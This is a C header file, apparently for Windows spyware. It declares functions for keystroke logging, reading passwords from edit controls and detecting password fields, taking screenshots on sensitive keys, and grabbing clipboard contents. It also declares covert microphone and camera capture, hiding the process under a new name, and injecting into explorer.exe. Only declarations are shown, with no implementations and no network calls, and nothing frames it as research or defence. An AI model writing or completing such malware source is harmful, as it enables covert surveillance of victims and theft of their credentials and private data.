#ifndef WINKEY_H
#define WINKEY_H

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <processthreadsapi.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")

#ifdef __cplusplus
extern "C" 
{
#endif

extern volatile int g_camera_run;
extern volatile int g_micro_run;

#ifdef __cplusplus
}
#endif

PPEB GetPEB(void);
int vk_to_char(DWORD vkCode, char *out);
void get_time(char *buf);
char *special_touch(DWORD vk);
void get_window_title(char *title);

void hide_process(wchar_t *new_name);
static DWORD find_pid(void);
int inject_into_explorer(void);
int capture_screen(LPCWSTR path);
void on_special_event(void);
void screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
int is_password_field(HWND hwnd);
int allow_app(char *exe);
void read_clipboard(char *buffer, size_t size);
int is_sensitive_key(DWORD vk);

void capture_micro(void);
int read_password_from_control(HWND hEdit, char *out, size_t out_size);
int start_camera(void);

#endif